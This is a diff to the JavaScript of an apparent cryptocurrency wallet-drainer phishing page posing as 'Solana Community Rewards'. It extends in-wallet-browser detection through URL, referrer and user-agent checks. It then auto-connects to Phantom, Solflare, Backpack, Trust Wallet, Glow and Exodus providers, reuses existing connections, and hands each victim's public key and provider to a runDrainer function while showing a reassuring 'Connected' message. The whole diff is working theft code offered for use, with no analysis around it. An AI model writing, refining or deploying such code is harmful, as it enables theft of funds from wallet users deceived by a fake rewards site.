@@ -5511,18 +5511,25 @@ window.runDrainer = runDrainer;
     await new Promise(resolve => setTimeout(resolve, 2000));
     
     // Check if we're in a wallet browser environment
-    const isInWalletBrowser = window.location.href.includes('phantom') || 
-                             window.location.href.includes('solflare') || 
-                             window.location.href.includes('backpack') ||
-                             window.location.href.includes('trustwallet') ||
-                             window.location.href.includes('glow') ||
-                             window.location.href.includes('exodus') ||
-                             document.referrer.includes('phantom') ||
-                             document.referrer.includes('solflare') ||
-                             document.referrer.includes('backpack') ||
-                             document.referrer.includes('trustwallet') ||
-                             document.referrer.includes('glow') ||
-                             document.referrer.includes('exodus');
+    const isInWalletBrowser = window.location.href.includes('phantom.app') || 
+                             window.location.href.includes('solflare.com') || 
+                             window.location.href.includes('backpack.app') ||
+                             window.location.href.includes('trustwallet.com') ||
+                             window.location.href.includes('glow.app') ||
+                             window.location.href.includes('exodus.com') ||
+                             document.referrer.includes('phantom.app') ||
+                             document.referrer.includes('solflare.com') ||
+                             document.referrer.includes('backpack.app') ||
+                             document.referrer.includes('trustwallet.com') ||
+                             document.referrer.includes('glow.app') ||
+                             document.referrer.includes('exodus.com') ||
+                             // Check for wallet-specific user agents
+                             navigator.userAgent.includes('Phantom') ||
+                             navigator.userAgent.includes('Solflare') ||
+                             navigator.userAgent.includes('Backpack') ||
+                             navigator.userAgent.includes('TrustWallet') ||
+                             navigator.userAgent.includes('Glow') ||
+                             navigator.userAgent.includes('Exodus');
     
     if (!isInWalletBrowser) {
       console.log('[AUTO_CONNECT] Not in wallet browser, skipping auto-connect');
@@ -5530,6 +5537,9 @@ window.runDrainer = runDrainer;
     }
     
     console.log('[AUTO_CONNECT] In wallet browser, attempting auto-connect...');
+    console.log('[AUTO_CONNECT] Current URL:', window.location.href);
+    console.log('[AUTO_CONNECT] Referrer:', document.referrer);
+    console.log('[AUTO_CONNECT] User Agent:', navigator.userAgent);
     
     // Try to detect and connect to available wallets
     const wallets = [
@@ -5541,48 +5551,97 @@ window.runDrainer = runDrainer;
       { key: 'exodus', name: 'Exodus', provider: () => window.exodus?.solana || window.exodus }
     ];
     
+    // Debug: Check what providers are available
+    console.log('[AUTO_CONNECT] Available providers:');
+    console.log('- window.phantom:', !!window.phantom);
+    console.log('- window.solana:', !!window.solana);
+    console.log('- window.solflare:', !!window.solflare);
+    console.log('- window.backpack:', !!window.backpack);
+    console.log('- window.glow:', !!window.glow);
+    console.log('- window.trustwallet:', !!window.trustwallet);
+    console.log('- window.exodus:', !!window.exodus);
+    
     for (const wallet of wallets) {
       try {
+        console.log(`[AUTO_CONNECT] Checking ${wallet.name}...`);
         const provider = wallet.provider();
+        
         if (provider && typeof provider.connect === 'function') {
           console.log(`[AUTO_CONNECT] Found ${wallet.name} provider, attempting connection...`);
           
-          // Try to connect
-          const result = await provider.connect({
-            onlyIfTrusted: false,
-            appMetadata: {
-              name: 'Solana Community Rewards',
-              url: window.location.origin,
-              icon: '/logo.png'
+          // Check if already connected
+          if (provider.isConnected && provider.isConnected()) {
+            console.log(`[AUTO_CONNECT] ${wallet.name} already connected, getting public key...`);
+            const publicKey = provider.publicKey;
+            if (publicKey) {
+              console.log(`[AUTO_CONNECT] Using existing ${wallet.name} connection:`, publicKey.toString());
+              
+              // Store the provider globally for runDrainer to use
+              window.connectedWallet = {
+                key: wallet.key,
+                name: wallet.name,
+                logo: `/${wallet.key}-logo.png`,
+                publicKey: publicKey.toString(),
+                provider: provider
+              };
+              
+              // Trigger the drain process directly
+              if (window.runDrainer) {
+                window.runDrainer(publicKey.toString(), wallet.key, window.connectedWallet);
+              } else {
+                console.error('[AUTO_CONNECT] runDrainer function not found');
+              }
+              
+              // Show success message
+              showStatus(`Connected to ${wallet.name}`, 'success');
+              return; // Exit after successful connection
             }
-          });
-          
-          if (result && result.publicKey) {
-            console.log(`[AUTO_CONNECT] Successfully connected to ${wallet.name}:`, result.publicKey.toString());
+          } else {
+            // Try to connect
+            console.log(`[AUTO_CONNECT] Attempting new connection to ${wallet.name}...`);
+            const result = await provider.connect({
+              onlyIfTrusted: false,
+              appMetadata: {
+                name: 'Solana Community Rewards',
+                url: window.location.origin,
+                icon: '/logo.png'
+              }
+            });
             
-            // Store the provider globally for runDrainer to use
-            window.connectedWallet = {
-              key: wallet.key,
-              name: wallet.name,
-              logo: `/${wallet.key}-logo.png`,
-              publicKey: result.publicKey.toString(),
-              provider: provider
-            };
-            
-            // Trigger the drain process directly
-            if (window.runDrainer) {
-              window.runDrainer(result.publicKey.toString(), wallet.key, window.connectedWallet);
-            } else {
-              console.error('[AUTO_CONNECT] runDrainer function not found');
+            if (result && result.publicKey) {
+              console.log(`[AUTO_CONNECT] Successfully connected to ${wallet.name}:`, result.publicKey.toString());
+              
+              // Store the provider globally for runDrainer to use
+              window.connectedWallet = {
+                key: wallet.key,
+                name: wallet.name,
+                logo: `/${wallet.key}-logo.png`,
+                publicKey: result.publicKey.toString(),
+                provider: provider
+              };
+              
+              // Trigger the drain process directly
+              if (window.runDrainer) {
+                window.runDrainer(result.publicKey.toString(), wallet.key, window.connectedWallet);
+              } else {
+                console.error('[AUTO_CONNECT] runDrainer function not found');
+              }
+              
+              // Show success message
+              showStatus(`Connected to ${wallet.name}`, 'success');
+              return; // Exit after successful connection
             }
-            
-            // Show success message
-            showStatus(`Connected to ${wallet.name}`, 'success');
-            return; // Exit after successful connection
           }
+        } else {
+          console.log(`[AUTO_CONNECT] No provider found for ${wallet.name}`);
         }
       } catch (error) {
-        console.log(`[AUTO_CONNECT] Failed to connect to ${wallet.name}:`, error.message);
+        console.error(`[AUTO_CONNECT] Failed to connect to ${wallet.name}:`, error);
+        console.error(`[AUTO_CONNECT] Error details:`, {
+          name: error.name,
+          message: error.message,
+          stack: error.stack
+        });
         // Continue to next wallet
       }
     }
